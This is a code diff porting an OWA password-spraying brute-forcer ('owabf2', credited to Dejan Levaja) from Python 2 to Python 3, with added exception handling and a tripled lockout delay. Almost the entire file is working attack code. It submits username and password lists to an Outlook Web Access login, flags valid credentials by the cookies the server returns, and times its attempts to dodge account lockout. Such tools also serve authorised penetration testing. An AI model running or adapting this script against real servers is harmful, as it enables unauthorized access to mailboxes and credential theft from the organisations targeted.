@@ -1,11 +1,9 @@
-#!/usr/bin/env python
-
-import Queue
+import queue as Queue
 import os
 import sys
 import threading
 import time
-import urlparse
+import urllib.parse as urlparse
 from argparse import ArgumentParser, RawTextHelpFormatter, SUPPRESS
 from random import randint
 
@@ -142,11 +140,11 @@ class Spray:
             if key in pwd_map:
                 pwd_map[key].extend(passwords)
 
-        users_left = pwd_map.keys()
+        users_left = list(pwd_map.keys())
 
         while True:
             if users_left:
-                for _ in xrange(attempts):
+                for _ in range(attempts):
                     for user in pwd_map:
                         if pwd_map[user]:
                             pwd = pwd_map[user].pop()
@@ -223,41 +221,46 @@ class Spray:
         position = (randint(0, len(messages) - 1))
         random_message = messages[position]
         msg = "\n[*] Waiting %s minute(s) in order to avoid account lockout. %s" % (window, random_message)
-        print msg
-        time.sleep(window * 60)
-
+        print(msg)
+        time.sleep(window * 3 * 60)  # Triplicar o valor do timeout
 
 def login(user_pwd):
     """
-    Check id credentials are valid against the target server
-    :return: number of cookies set by server or 0. In case of successfull login, number of cookies will be > 1 !
+    Check if credentials are valid against the target server
+    :return: number of cookies set by server or 0. In case of successful login, number of cookies will be > 1 !
     """
-    user, pwd = user_pwd
-    payload = {'destination': server,
-               'flags': 4,
-               'forcedownlevel': 0,
-               'username': user,
-               'password': pwd,
-               'passwordText': '',
-               'isUtf8': 1}
-    r = requests.post(server, data=payload, verify=False, proxies=proxy, allow_redirects=False)
-    if r.status_code == 302:
-        cookies = r.cookies
-        cookie_num = len(cookies)
-        if cookie_num >= num_cookies:
-            msg = '[+++] Jackpot => "%s" : "%s"' % (user, pwd)
-            lock.acquire()
-            write_log(msg)
-            print msg
-            lock.release()
-        else:
-            if verbose:
+    try:
+        user, pwd = user_pwd
+        payload = {'destination': server,
+                   'flags': 4,
+                   'forcedownlevel': 0,
+                   'username': user,
+                   'password': pwd,
+                   'passwordText': '',
+                   'isUtf8': 1}
+        r = requests.post(server, data=payload, verify=False, proxies=proxy, allow_redirects=False)
+        if r.status_code == 302:
+            cookies = r.cookies
+            cookie_num = len(cookies)
+            if cookie_num >= num_cookies:
+                msg = '[+++] Jackpot => "%s" : "%s"' % (user, pwd)
                 lock.acquire()
-                print '[-] Failed login for: "%s" : "%s"' % (user, pwd)
+                write_log(msg)
+                print(msg)
                 lock.release()
-    else:
+            else:
+                if verbose:
+                    lock.acquire()
+                    print('[-] Failed login for: "%s" : "%s"' % (user, pwd))
+                    lock.release()
+        else:
+            lock.acquire()
+            print('\n[!] Wrong status code [%s]. Is the target URL valid?' % r.status_code)
+            lock.release()
+    except Exception as e:
         lock.acquire()
-        print '\n[!] Wrong status code [%s]. Is the target URL valid?' % r.status_code
+        if verbose:
+            print(f'\n[!] Exception occurred during login: {e}')
         lock.release()
 
 
@@ -266,51 +269,65 @@ def shameless_plug():
     Shameless plug
     :return:
     """
-    print '\n'
-    print "*" * 50
-    print "*       Password spraying OWA bruteforcer        *"
-    print "*                 Dejan Levaja                   *"
-    print "*           RAS-IT & PreCogSecurity              *"
-    print "*             http://www.ras-it.rs               *"
-    print "*         http://www.precogsecurity.com          *"
-    print "*" * 50
-    print '\n'
+    print('\n')
+    print("*" * 50)
+    print("*       Password spraying OWA bruteforcer        *")
+    print("*                 Dejan Levaja                   *")
+    print("*           RAS-IT & PreCogSecurity              *")
+    print("*             http://www.ras-it.rs               *")
+    print("*         http://www.precogsecurity.com          *")
+    print("*" * 50)
+    print('\n')
 
 
 def check_log_file():
     """
-    Check if log file already exist. If it does, offer to overwrite or not (append)
+    Check if log file already exists. If it does, offer to overwrite or not (append)
     :return:
     """
-    if os.path.exists(logfile):
-        answer = ' '
-        while answer.lower() not in ('y', 'n', ''):
-            answer = raw_input("\n[!] Log file exists. Overwrite [Y|n]?  ")
-        else:
-            if answer.lower() in ('y', ''):
-                with open(logfile, 'w'):
-                    pass
+    try:
+        if os.path.exists(logfile):
+            answer = ' '
+            while answer.lower() not in ('y', 'n', ''):
+                answer = input("\n[!] Log file exists. Overwrite [Y|n]?  ")
+            else:
+                if answer.lower() in ('y', ''):
+                    with open(logfile, 'w'):
+                        pass
+    except Exception as e:
+        if verbose:
+            print(f'\n[!] Exception occurred while checking log file: {e}')
 
 
 def check_url(url):
-    r = requests.get(url, verify=False)
-    return r.status_code
+    try:
+        r = requests.get(url, verify=False)
+        return r.status_code
+    except Exception as e:
+        if verbose:
+            print(f'\n[!] Exception occurred while checking URL: {e}')
+        return None
 
 
 def check_path():
-    current_path = urlparse.urlparse(target).path
-    if not current_path or current_path == "/":
-        srv = target.rstrip('/')   # just in case
-        print '[!] Trying to guess OWA version. Please wait...'
-        for key, value in paths.items():
-            url = srv + value
-            if check_url(url) == 200:
-                print '[!] Looks like %s' % key
-                print '[!] Using "%s" as a target' % url
-                return url
-    else:
-        print '[!] Using "%s" as a target' % target
-        return target
+    try:
+        current_path = urlparse.urlparse(target).path
+        if not current_path or current_path == "/":
+            srv = target.rstrip('/')   # just in case
+            print('[!] Trying to guess OWA version. Please wait...')
+            for key, value in paths.items():
+                url = srv + value
+                if check_url(url) == 200:
+                    print('[!] Looks like %s' % key)
+                    print('[!] Using "%s" as a target' % url)
+                    return url
+        else:
+            print('[!] Using "%s" as a target' % target)
+            return target
+    except Exception as e:
+        if verbose:
+            print(f'\n[!] Exception occurred while checking path: {e}')
+        return None
 
 
 def write_log(msg):
@@ -330,63 +347,72 @@ def main():
     Main.
     :return:
     """
-    check_log_file()
-    msg = '[*] May the (brute) force be with you! Starting %s parallel threads.' % threads
-    print "\n%s" % msg
-    print "*" * 70 + '\n'
-    write_log(msg)
-    time.sleep(0.2)
-    spray = Spray()
-    if pwd_file and not pwd_folder:
-        spray.spray_from_common_pwd_file()
-    elif not pwd_file and pwd_folder:
-        spray.spray_from_personalized_pwd_file()
+    try:
+        check_log_file()
+        msg = '[*] May the (brute) force be with you! Starting %s parallel threads.' % threads
+        print("\n%s" % msg)
+        print("*" * 70 + '\n')
+        write_log(msg)
+        time.sleep(0.2)
+        spray = Spray()
+        if pwd_file and not pwd_folder:
+            spray.spray_from_common_pwd_file()
+        elif not pwd_file and pwd_folder:
+            spray.spray_from_personalized_pwd_file()
+    except Exception as e:
+        if verbose:
+            print(f'\n[!] Exception occurred in main: {e}')
 
 
 if __name__ == '__main__':
-    shameless_plug()
-    time.sleep(0.1)
-    parser = ArgumentParser(epilog=epilog, formatter_class=RawTextHelpFormatter, usage=SUPPRESS)
-    parser.add_argument('-s', '--server', help='OWA server', required=True)
-    parser.add_argument('-x', '--proxy', help='Proxy server address in the form of http://proxy:port', default={})
-    parser.add_argument('-u', '--users', help='File containing usernames', required=True)
-    parser.add_argument('-p', '--pwds', help='File containing passwords')
-    parser.add_argument('-f', '--pwd-folder', help='Folder containing personalized password files. Check https://github.com/dejanlevaja/email2pwd')
-    parser.add_argument('-t', '--threads', help='Number of threads. Default is 50.', default=50)
-    parser.add_argument('-n', '--number-of-cookies', help='Number of cookies returned by the server upon successfull login. Default is 4.', default=4)
-    parser.add_argument('-a', '--login-attempts', help='Number of login attempts in each iteration. Used with "-w". Default is 5.', default=5)
-    parser.add_argument('-w', '--lockout-window', help='Minutes to wait between login attempt iterations. Default is 31.', default=31)
-    parser.add_argument('-l', '--log', help='Log file. Default is "./owabf2.log', default='./owabf2.log')
-    parser.add_argument('-v', '--verbose', help='Print all attempts', action='store_true')
-    args = vars(parser.parse_args())
+    try:
+        shameless_plug()
+        time.sleep(0.1)
+        parser = ArgumentParser(epilog=epilog, formatter_class=RawTextHelpFormatter, usage=SUPPRESS)
+        parser.add_argument('-s', '--server', help='OWA server', required=True)
+        parser.add_argument('-x', '--proxy', help='Proxy server address in the form of http://proxy:port', default={})
+        parser.add_argument('-u', '--users', help='File containing usernames', required=True)
+        parser.add_argument('-p', '--pwds', help='File containing passwords')
+        parser.add_argument('-f', '--pwd-folder', help='Folder containing personalized password files. Check https://github.com/dejanlevaja/email2pwd')
+        parser.add_argument('-t', '--threads', help='Number of threads. Default is 50.', default=50)
+        parser.add_argument('-n', '--number-of-cookies', help='Number of cookies returned by the server upon successful login. Default is 4.', default=4)
+        parser.add_argument('-a', '--login-attempts', help='Number of login attempts in each iteration. Used with "-w". Default is 5.', default=5)
+        parser.add_argument('-w', '--lockout-window', help='Minutes to wait between login attempt iterations. Default is 31.', default=31)
+        parser.add_argument('-l', '--log', help='Log file. Default is "./owabf2.log', default='./owabf2.log')
+        parser.add_argument('-v', '--verbose', help='Print all attempts', action='store_true')
+        args = vars(parser.parse_args())
 
-    target      = args['server']
-    proxy       = args['proxy']
-    usr_file    = args['users']
-    pwd_file    = args['pwds']
-    pwd_folder  = args['pwd_folder']
-    threads     = int(args['threads'])
-    num_cookies = int(args['number_of_cookies'])
-    attempts    = args['login_attempts']
-    window      = int(args['lockout_window'])
-    logfile     = args['log']
-    verbose     = args['verbose']
+        target      = args['server']
+        proxy       = args['proxy']
+        usr_file    = args['users']
+        pwd_file    = args['pwds']
+        pwd_folder  = args['pwd_folder']
+        threads     = int(args['threads'])
+        num_cookies = int(args['number_of_cookies'])
+        attempts    = int(args['login_attempts'])
+        window      = int(args['lockout_window'])
+        logfile     = args['log']
+        verbose     = args['verbose']
 
-    if not target.startswith('http'):
-        print '\n[!] Server address should start with http:// or https://\n'
-        sys.exit()
+        if not target.startswith('http'):
+            print('\n[!] Server address should start with http:// or https://\n')
+            sys.exit()
 
-    server = check_path()
+        server = check_path()
 
-    if pwd_file and pwd_folder:
-        print '\n[!] You cannot use "-p" and "-f" together.\n'
-        sys.exit()
+        if pwd_file and pwd_folder:
+            print('\n[!] You cannot use "-p" and "-f" together.\n')
+            sys.exit()
 
-    if not pwd_file and not pwd_folder:
-        print '\n[!] You must use "-p" or "-f".\n'
-        sys.exit()
+        if not pwd_file and not pwd_folder:
+            print('\n[!] You must use "-p" or "-f".\n')
+            sys.exit()
 
-    main()
-    sys.exit("\n[!] Done.")
+        main()
+        sys.exit("\n[!] Done.")
+    except Exception as e:
+        if verbose:
+            print(f'\n[!] Exception occurred in __main__: {e}')
+        sys.exit("\n[!] Exiting due to error.")
 
 
